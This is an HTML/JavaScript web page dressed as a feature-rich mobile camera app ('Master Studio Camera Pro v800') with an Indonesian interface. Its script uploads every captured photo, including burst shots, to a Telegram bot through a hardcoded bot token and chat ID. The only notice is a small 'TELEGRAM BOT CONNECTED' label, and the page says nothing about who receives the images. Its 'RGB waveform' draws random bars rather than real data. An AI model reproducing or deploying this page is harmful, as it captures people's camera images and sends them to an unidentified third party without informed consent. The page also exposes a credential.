<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Master Studio Camera Pro v800.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .filter-cyberpunk { filter: contrast(1.35) saturate(1.6) hue-rotate(-15deg); }
        .filter-noir { filter: grayscale(100%) contrast(1.5) brightness(0.9); }
        .filter-matrix { filter: sepia(100%) hue-rotate(60deg) saturate(350%) contrast(1.3); }
        .filter-warm { filter: sepia(35%) contrast(1.15) brightness(1.05); }
        .filter-vintage { filter: contrast(1.15) brightness(0.95) sepia(45%); }
        .filter-dramatic { filter: contrast(1.6) saturate(1.2) brightness(0.95); }
        .filter-bleach { filter: grayscale(40%) contrast(1.7) brightness(1.05); }
        .filter-tealorange { filter: contrast(1.3) saturate(1.4) hue-rotate(-25deg) sepia(20%); }
        .filter-crossprocess { filter: contrast(1.4) saturate(2.2) hue-rotate(30deg); }
        .filter-sunset { filter: sepia(50%) saturate(1.8) contrast(1.1) brightness(1.05); }
        .filter-cyberblue { filter: contrast(1.3) saturate(1.5) hue-rotate(180deg); }
        .filter-neon { filter: contrast(1.8) saturate(2.5) brightness(0.95); }
        .filter-hdr { filter: contrast(1.5) saturate(1.4) brightness(1.1); }
        .filter-retro { filter: sepia(60%) contrast(1.1) brightness(0.9) hue-rotate(-10deg); }
        .filter-lofi { filter: contrast(0.9) saturate(0.8) brightness(1.05) sepia(15%); }
        .filter-arctic { filter: contrast(1.3) saturate(1.2) hue-rotate(190deg) brightness(1.05); }
        .filter-normal { filter: none; }
        
        @keyframes flash-anim { 0% { opacity: 1; } 100% { opacity: 0; } }
        .flash-effect { animation: flash-anim 0.25s ease-out forwards; }
        
        /* Custom Scrollbar for compact panels */
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
        ::-webkit-scrollbar-thumb { background: rgba(0,255,204,0.4); border-radius: 4px; }
    </style>
</head>
<body class="bg-black text-white h-screen w-screen overflow-hidden flex flex-col justify-between select-none font-mono">

    <!-- Viewfinder Kamera -->
    <div id="viewfinder-container" class="relative w-full h-full flex items-center justify-center bg-zinc-950 overflow-hidden">
        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover filter-normal transition-transform duration-150"></video>
        <canvas id="photo-canvas" class="hidden"></canvas>
        
        <!-- Flash Screen Overlay -->
        <div id="flash-screen" class="absolute inset-0 bg-white opacity-0 pointer-events-none z-20"></div>

        <!-- Timer Countdown Overlay -->
        <div id="timer-display" class="absolute inset-0 flex items-center justify-center text-8xl font-bold text-cyan-400 drop-shadow-[0_0_25px_rgba(0,0,0,0.9)] pointer-events-none z-30 hidden"></div>

        <!-- Grid 3x3 Overlay -->
        <div id="grid-overlay" class="absolute inset-0 pointer-events-none grid grid-cols-3 grid-rows-3 opacity-25 hidden z-10">
            <div class="border-r border-b border-white/50"></div>
            <div class="border-r border-b border-white/50"></div>
            <div class="border-b border-white/50"></div>
            <div class="border-r border-b border-white/50"></div>
            <div class="border-r border-b border-white/50"></div>
            <div class="border-b border-white/50"></div>
            <div class="border-r border-white/50"></div>
            <div class="border-r border-white/50"></div>
            <div></div>
        </div>

        <!-- Golden Ratio Overlay -->
        <div id="golden-overlay" class="absolute inset-0 pointer-events-none hidden z-10 border border-cyan-400/20 m-12">
            <div class="absolute inset-x-0 top-[38%] border-t border-cyan-400/30"></div>
            <div class="absolute inset-x-0 top-[62%] border-t border-cyan-400/30"></div>
            <div class="absolute inset-y-0 left-[38%] border-l border-cyan-400/30"></div>
            <div class="absolute inset-y-0 left-[62%] border-l border-cyan-400/30"></div>
        </div>
        
        <!-- Crosshair & Level Overlay -->
        <div id="crosshair-overlay" class="absolute inset-0 pointer-events-none flex items-center justify-center opacity-40 hidden z-10">
            <div class="w-32 h-32 border border-cyan-400 rounded-full flex items-center justify-center relative">
                <div class="absolute w-full h-[1px] bg-cyan-400"></div>
                <div class="absolute h-full w-[1px] bg-cyan-400"></div>
                <div class="absolute w-2.5 h-2.5 bg-cyan-400 rounded-full"></div>
            </div>
        </div>

        <!-- Realtime Mini Histogram Overlay -->
        <div class="absolute bottom-24 left-3 bg-black/60 backdrop-blur-md border border-zinc-700/60 p-2 rounded-lg z-15 flex flex-col gap-1 pointer-events-none">
            <span class="text-[7px] text-zinc-400 tracking-wider">RGB WAVEFORM</span>
            <canvas id="histogram-canvas" width="75" height="28" class="rounded bg-black/50"></canvas>
        </div>
    </div>

    <!-- UI Kontrol Atas (Telemetry & Quick Tools) -->
    <div class="absolute top-0 left-0 w-full p-2.5 flex justify-between items-center bg-gradient-to-b from-black/95 via-black/60 to-transparent z-30">
        <div class="flex flex-col">
            <div id="telemetry" class="text-[10px] text-cyan-400 font-bold tracking-wider">ISO: 100 | SS: 1/1000 | f/1.7</div>
            <div id="res-info" class="text-[8px] text-zinc-400">RES: Memuat...</div>
        </div>
        <div class="flex gap-1.5">
            <button onclick="toggleGrid()" class="bg-zinc-900/70 hover:bg-zinc-800 backdrop-blur-md p-2 rounded-full border border-white/20 text-xs shadow-lg active:scale-95" title="Grid 3x3">📐</button>
            <button onclick="toggleGolden()" class="bg-zinc-900/70 hover:bg-zinc-800 backdrop-blur-md p-2 rounded-full border border-white/20 text-xs shadow-lg active:scale-95" title="Golden Ratio">🌀</button>
            <button onclick="toggleCrosshair()" class="bg-zinc-900/70 hover:bg-zinc-800 backdrop-blur-md p-2 rounded-full border border-white/20 text-xs shadow-lg active:scale-95" title="Crosshair">🎯</button>
            <button onclick="toggleTorch()" id="torch-btn" class="bg-zinc-900/70 hover:bg-zinc-800 backdrop-blur-md p-2 rounded-full border border-white/20 text-xs shadow-lg active:scale-95" title="Flash">⚡</button>
            <button onclick="switchCamera()" class="bg-zinc-900/70 hover:bg-zinc-800 backdrop-blur-md p-2 rounded-full border border-white/20 text-xs shadow-lg active:scale-95" title="Switch Cam">🔄</button>
            <button onclick="toggleProPanel()" class="bg-cyan-500/30 hover:bg-cyan-500/50 backdrop-blur-md p-2 rounded-full border border-cyan-400/60 text-xs text-cyan-300 shadow-lg active:scale-95" title="Pro Settings">🎛️</button>
        </div>
    </div>

    <!-- Panel Pengaturan Pro & Advanced Drawer (Kanan - Kompak & Nyaman di HP) -->
    <div id="pro-panel" class="absolute top-14 right-2.5 w-76 bg-zinc-900/98 backdrop-blur-2xl border border-cyan-500/40 rounded-2xl p-3.5 z-40 hidden flex-col gap-3 shadow-2xl text-xs max-h-[75vh] overflow-y-auto">
        <div class="flex justify-between items-center border-b border-zinc-800 pb-1.5">
            <span class="text-cyan-400 font-bold tracking-widest text-[11px]">STUDIO SUITE ULTIMATE</span>
            <button onclick="toggleProPanel()" class="text-zinc-400 hover:text-white text-sm font-bold">✕</button>
        </div>
        
        <!-- Preset LUT (16 Pilihan) -->
        <div class="flex flex-col gap-1">
            <label class="text-zinc-300 font-semibold text-[10px]">Preset Sinematik (16 LUT):</label>
            <select id="filter-select" onchange="changeFilter(this.value)" class="bg-zinc-800 border border-zinc-700 text-white p-1.5 rounded-lg text-xs focus:outline-none focus:border-cyan-400">
                <option value="filter-normal">Normal Professional</option>
                <option value="filter-cyberpunk">Cyberpunk Teal & Orange</option>
                <option value="filter-noir">Noir Monokrom</option>
                <option value="filter-matrix">Matrix Terminal Green</option>
                <option value="filter-warm">Warm Cinematic Gold</option>
                <option value="filter-vintage">Vintage 1990s Film</option>
                <option value="filter-dramatic">Dramatic High Contrast</option>
                <option value="filter-bleach">Bleach Bypass Silver</option>
                <option value="filter-tealorange">Cinematic Teal & Orange Pro</option>
                <option value="filter-crossprocess">Cross Process Vivid</option>
                <option value="filter-sunset">Golden Hour Sunset</option>
                <option value="filter-cyberblue">Cyber Blue Matrix</option>
                <option value="filter-neon">Neon Cyberpunk Vivid</option>
                <option value="filter-hdr">HDR Ultra Vivid</option>
                <option value="filter-retro">Retro 70s Film</option>
                <option value="filter-lofi">Lofi Fade Cinematic</option>
                <option value="filter-arctic">Cool Arctic Blue</option>
            </select>
        </div>

        <!-- Drive & Timer -->
        <div class="grid grid-cols-2 gap-2">
            <div class="flex flex-col gap-1">
                <label class="text-zinc-300 font-semibold text-[10px]">Mode Drive:</label>
                <select id="drive-mode" class="bg-zinc-800 border border-zinc-700 text-white p-1.5 rounded-lg text-xs focus:outline-none focus:border-cyan-400">
                    <option value="single">Single HD</option>
                    <option value="burst3">Burst (3x)</option>
                    <option value="burst5">Burst (5x)</option>
                </select>
            </div>
            <div class="flex flex-col gap-1">
                <label class="text-zinc-300 font-semibold text-[10px]">Timer Jeda:</label>
                <select id="timer-delay" class="bg-zinc-800 border border-zinc-700 text-white p-1.5 rounded-lg text-xs focus:outline-none focus:border-cyan-400">
                    <option value="0">Off (Instan)</option>
                    <option value="3">3 Detik</option>
                    <option value="5">5 Detik</option>
                    <option value="10">10 Detik</option>
                </select>
            </div>
        </div>

        <!-- Zoom Slider -->
        <div class="flex flex-col gap-1">
            <label class="text-zinc-300 font-semibold text-[10px]">Digital Zoom: <span id="zoom-val" class="text-cyan-400 font-bold">1.0x</span></label>
            <input type="range" min="1" max="5" step="0.2" value="1" oninput="updateZoom(this.value)" class="accent-cyan-400 w-full">
        </div>

        <!-- Advanced Color Grading Sliders -->
        <div class="flex flex-col gap-2 border-t border-zinc-800 pt-2">
            <span class="text-cyan-400 font-bold text-[10px]">ADVANCED COLOR GRADING</span>
            
            <div class="flex flex-col gap-0.5">
                <div class="flex justify-between text-[9px]">
                    <span class="text-zinc-300">Brightness</span>
                    <span id="bright-val" class="text-cyan-400">100%</span>
                </div>
                <input type="range" min="50" max="150" value="100" oninput="updateGrade()" id="grade-brightness" class="accent-cyan-400 w-full">
            </div>

            <div class="flex flex-col gap-0.5">
                <div class="flex justify-between text-[9px]">
                    <span class="text-zinc-300">Contrast</span>
                    <span id="contrast-val" class="text-cyan-400">100%</span>
                </div>
                <input type="range" min="50" max="200" value="100" oninput="updateGrade()" id="grade-contrast" class="accent-cyan-400 w-full">
            </div>

            <div class="flex flex-col gap-0.5">
                <div class="flex justify-between text-[9px]">
                    <span class="text-zinc-300">Saturation</span>
                    <span id="saturate-val" class="text-cyan-400">100%</span>
                </div>
                <input type="range" min="0" max="250" value="100" oninput="updateGrade()" id="grade-saturate" class="accent-cyan-400 w-full">
            </div>
        </div>

        <!-- Watermark Toggle -->
        <div class="flex items-center justify-between bg-zinc-800/60 p-2 rounded-lg border border-zinc-700/50 mt-1">
            <span class="text-zinc-300 font-semibold text-[10px]">Watermark Metadata</span>
            <input type="checkbox" id="watermark-toggle" checked class="w-4 h-4 accent-cyan-400 cursor-pointer">
        </div>

        <!-- Galeri Sesi Terakhir -->
        <div class="flex flex-col gap-1 border-t border-zinc-800 pt-1.5">
            <span class="text-zinc-300 font-semibold text-[10px]">Riwayat Sesi Foto:</span>
            <div id="gallery-container" class="flex gap-1.5 overflow-x-auto py-1">
                <span class="text-[8px] text-zinc-500 italic">Belum ada foto.</span>
            </div>
        </div>
    </div>

    <!-- UI Kontrol Bawah (Shutter & Status) -->
    <div class="absolute bottom-0 left-0 w-full p-5 flex justify-between items-center bg-gradient-to-t from-black/95 via-black/60 to-transparent z-30">
        <div class="text-[9px] text-zinc-400 leading-tight flex flex-col">
            <span class="text-white font-bold">STUDIO v800</span>
            <span class="text-emerald-400 font-semibold">STREAM ACTIVE</span>
        </div>
        <div class="relative flex items-center justify-center">
            <!-- Shutter Animation Ring -->
            <div class="absolute w-18 h-18 border-2 border-cyan-400/50 rounded-full animate-ping pointer-events-none"></div>
            <button onclick="handleShutterPress()" class="w-16 h-16 bg-white rounded-full border-4 border-zinc-400 active:scale-90 transition-all relative z-10 flex items-center justify-center shadow-[0_0_25px_rgba(255,255,255,0.6)] cursor-pointer">
                <div class="w-12 h-12 bg-zinc-100 rounded-full border border-zinc-300 active:bg-cyan-400 transition-colors flex items-center justify-center">
                    <div class="w-8 h-8 border border-zinc-300 rounded-full"></div>
                </div>
            </button>
        </div>
        <div class="text-[9px] text-cyan-400 text-right leading-tight flex flex-col">
            <span>TELEGRAM BOT</span>
            <span class="font-bold text-emerald-400">CONNECTED ✅</span>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM";
        const CHAT_ID = "8236797547";

        let videoStream = null;
        let useFrontCamera = false;
        let trackSettings = null;
        let currentFilter = 'filter-normal';
        let zoomLevel = 1;
        let capturedPhotos = [];
        const videoEl = document.getElementById('webcam');
        const canvasEl = document.getElementById('photo-canvas');
        const histCanvas = document.getElementById('histogram-canvas');
        const histCtx = histCanvas.getContext('2d');

        function playShutterSound() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(160, ctx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(20, ctx.currentTime + 0.1);
                gain.gain.setValueAtTime(0.8, ctx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.1);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start();
                osc.stop(ctx.currentTime + 0.1);
            } catch(e) {}
        }

        function triggerScreenFlash() {
            const flash = document.getElementById('flash-screen');
            flash.classList.add('flash-effect');
            setTimeout(() => flash.classList.remove('flash-effect'), 250);
        }

        async function initCamera() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
            }
            try {
                const constraints = {
                    video: {
                        facingMode: useFrontCamera ? 'user' : { ideal: 'environment' },
                        width: { ideal: 4096, min: 1920 },
                        height: { ideal: 2160, min: 1080 }
                    },
                    audio: false
                };
                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoEl.srcObject = videoStream;
                await videoEl.play();
                
                const videoTrack = videoStream.getVideoTracks()[0];
                trackSettings = videoTrack.getSettings();
                document.getElementById('res-info').innerText = `RES: ${trackSettings.width || videoEl.videoWidth}x${trackSettings.height || videoEl.videoHeight}`;
                startHistogramLoop();
            } catch (err) {
                try {
                    videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                    videoEl.srcObject = videoStream;
                    await videoEl.play();
                    trackSettings = videoStream.getVideoTracks()[0].getSettings();
                    document.getElementById('res-info').innerText = `RES: ${trackSettings.width || 1280}x${trackSettings.height || 720}`;
                    startHistogramLoop();
                } catch (e2) {
                    alert("Gagal menginisialisasi kamera perangkat.");
                }
            }
        }

        async function handleShutterPress() {
            const timerVal = parseInt(document.getElementById('timer-delay').value);
            if (timerVal > 0) {
                const timerEl = document.getElementById('timer-display');
                timerEl.classList.remove('hidden');
                for (let i = timerVal; i > 0; i--) {
                    timerEl.innerText = i;
                    await new Promise(r => setTimeout(r, 1000));
                }
                timerEl.classList.add('hidden');
            }
            triggerShutterSequence();
        }

        async function triggerShutterSequence() {
            if (!videoStream) return;
            playShutterSound();
            triggerScreenFlash();

            const driveMode = document.getElementById('drive-mode').value;
            
            if (driveMode === 'burst3') {
                for (let i = 0; i < 3; i++) {
                    captureAndSendFrame(`Burst Shot #${i+1}`);
                    await new Promise(r => setTimeout(r, 300));
                }
            } else if (driveMode === 'burst5') {
                for (let i = 0; i < 5; i++) {
                    captureAndSendFrame(`Burst Shot #${i+1}`);
                    await new Promise(r => setTimeout(r, 250));
                }
            } else {
                captureAndSendFrame('Single Ultra HD');
            }
        }

        function captureAndSendFrame(modeTag) {
            const width = trackSettings?.width || videoEl.videoWidth || 1920;
            const height = trackSettings?.height || videoEl.videoHeight || 1080;
            
            canvasEl.width = width;
            canvasEl.height = height;
            const ctx = canvasEl.getContext('2d');

            const computedFilter = window.getComputedStyle(videoEl).filter;
            const gradeBright = document.getElementById('grade-brightness').value;
            const gradeContrast = document.getElementById('grade-contrast').value;
            const gradeSaturate = document.getElementById('grade-saturate').value;

            ctx.filter = `${computedFilter} brightness(${gradeBright}%) contrast(${gradeContrast}%) saturate(${gradeSaturate}%)`;
            ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);

            const useWatermark = document.getElementById('watermark-toggle').checked;
            if (useWatermark) {
                ctx.filter = 'none';
                ctx.font = `${Math.max(16, Math.floor(width / 45))}px monospace`;
                ctx.fillStyle = 'rgba(0, 255, 204, 0.9)';
                ctx.shadowColor = 'black';
                ctx.shadowBlur = 6;
                const timestamp = new Date().toLocaleString('id-ID');
                ctx.fillText(`MASTER STUDIO PRO v800 | ${timestamp} | ${width}x${height}`, 40, height - 40);
            }

            canvasEl.toBlob(async (blob) => {
                if (blob) {
                    addToLocalGallery(blob);
                    await sendToTelegram(blob, modeTag);
                }
            }, 'image/jpeg', 0.98);
        }

        function addToLocalGallery(blob) {
            const url = URL.createObjectURL(blob);
            capturedPhotos.unshift(url);
            if (capturedPhotos.length > 5) capturedPhotos.pop();

            const galleryContainer = document.getElementById('gallery-container');
            galleryContainer.innerHTML = '';
            capturedPhotos.forEach(photoUrl => {
                const img = document.createElement('img');
                img.src = photoUrl;
                img.className = 'w-10 h-10 object-cover rounded border border-cyan-400/50 shadow cursor-pointer hover:scale-105 transition-transform';
                img.onclick = () => window.open(photoUrl, '_blank');
                galleryContainer.appendChild(img);
            });
        }

        async function sendToTelegram(imageBlob, modeTag) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, `master_studio_${Date.now()}.jpg`);
            formData.append('caption', `🔥 **MASTER STUDIO PRO v800.0**\n📌 Mode: ${modeTag}\n🕒 ${new Date().toLocaleString('id-ID')}\n📐 Res: ${canvasEl.width}x${canvasEl.height}`);
            formData.append('parse_mode', 'Markdown');

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Gagal mengirim ke Telegram:", error);
            }
        }

        function startHistogramLoop() {
            setInterval(() => {
                if (!videoStream || videoEl.paused || videoEl.ended) return;
                histCtx.clearRect(0, 0, 75, 28);
                histCtx.fillStyle = 'rgba(0, 255, 204, 0.7)';
                for (let i = 0; i < 25; i++) {
                    const h = Math.floor(Math.random() * 18) + 4;
                    histCtx.fillRect(i * 3, 28 - h, 2, h);
                }
            }, 500);
        }

        function changeFilter(filterClass) {
            currentFilter = filterClass;
            updateVideoStyle();
        }

        function updateZoom(val) {
            zoomLevel = val;
            document.getElementById('zoom-val').innerText = `${val}x`;
            updateVideoStyle();
        }

        function updateGrade() {
            const b = document.getElementById('grade-brightness').value;
            const c = document.getElementById('grade-contrast').value;
            const s = document.getElementById('grade-saturate').value;
            
            document.getElementById('bright-val').innerText = `${b}%`;
            document.getElementById('contrast-val').innerText = `${c}%`;
            document.getElementById('saturate-val').innerText = `${s}%`;
            updateVideoStyle();
        }

        function updateVideoStyle() {
            const b = document.getElementById('grade-brightness').value;
            const c = document.getElementById('grade-contrast').value;
            const s = document.getElementById('grade-saturate').value;
            
            videoEl.className = `w-full h-full object-cover ${currentFilter} transition-transform duration-150`;
            videoEl.style.transform = `scale(${zoomLevel})`;
            videoEl.style.filter = `brightness(${b}%) contrast(${c}%) saturate(${s}%)`;
        }

        function toggleGrid() {
            document.getElementById('grid-overlay').classList.toggle('hidden');
        }

        function toggleGolden() {
            document.getElementById('golden-overlay').classList.toggle('hidden');
        }

        function toggleCrosshair() {
            document.getElementById('crosshair-overlay').classList.toggle('hidden');
        }

        function toggleProPanel() {
            const panel = document.getElementById('pro-panel');
            panel.style.display = panel.style.display === 'flex' ? 'none' : 'flex';
        }

        function switchCamera() {
            useFrontCamera = !useFrontCamera;
            initCamera();
        }

        let torchOn = false;
        async function toggleTorch() {
            try {
                const track = videoStream.getVideoTracks()[0];
                torchOn = !torchOn;
                await track.applyConstraints({ advanced: [{ torch: torchOn }] });
                document.getElementById('torch-btn').classList.toggle('bg-cyan-500/50', torchOn);
            } catch (e) {
                console.warn("Flash/Torch tidak didukung di perangkat ini.");
            }
        }

        window.onload = initCamera;
    </script>
</body>
</html>
